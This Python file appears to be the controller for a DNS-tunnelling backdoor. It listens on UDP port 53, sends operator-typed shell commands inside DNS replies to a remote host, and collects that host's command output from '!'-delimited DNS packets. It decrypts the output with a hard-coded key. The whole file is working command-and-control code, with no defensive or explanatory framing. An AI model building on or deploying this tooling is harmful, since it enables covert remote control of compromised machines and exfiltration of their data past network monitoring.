from datetime import datetime
import socket
import base64
from dataEncryptor import dataEncryptor
from payload import Payload


class DNSServer:
    def __init__(self,port,ip):
        self.port = port
        self.ip = ip

    def start(self):
        commandRan = False
        commandFinished = True
        while 1:
            if commandFinished:
                packets = bytearray()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.bind((self.ip,self.port))
                print("UDP Server Started Listening")
                req, address = sock.recvfrom(512) #start listening
                printWithTime("UDP", f"Received {len(req)} bytes from {address}")
                command = input("Enter a command:")
                p = Payload("192.168.7.202")
                p.payload(sock,req,command)
                commandRan = True
                newDataList = list()
            if commandRan:
                req, address = sock.recvfrom(512) #start listening
                printWithTime("UDP", f"Received {len(req)} bytes from {address}")
                dataList = list(req)
                newDataList = list()
                found = False
                count = 0
                for i in dataList:
                    if i == 33:
                        found = True
                        count += 1
                        if count == 2:
                            break
                    elif found:
                        newDataList.append(i)
                bytesNewDataList = bytearray(newDataList)
                if bytesNewDataList.decode('utf-8') != 'end':
                    packets.extend(bytesNewDataList)
                    commandFinished = False
                else:
                    packets = bytes(packets)
                    packets = packets.decode('utf-8')
                    d = dataEncryptor()
                    output = d.decrypting(packets,"hellothisismebob")
                    output = output.decode('utf-8')
                    print(output)
                    output2 = ""
                    for i in repr(output):
                        if i == "'":
                            continue
                        elif i == "\\":
                            break
                        else:
                            output2 += i 
                    print("Output of " + command + ":" + output2)       
                    commandRan = False
                    commandFinished = True
                    sock.close()

def printWithTime(head, message):
        curr_time = datetime.now().strftime("%H:%M:%S.%f")
        print(f"[{head}] [{curr_time[:-3]}]", message)

def main():
    dns = DNSServer(53,"192.168.7.168")
    dns.start()

main()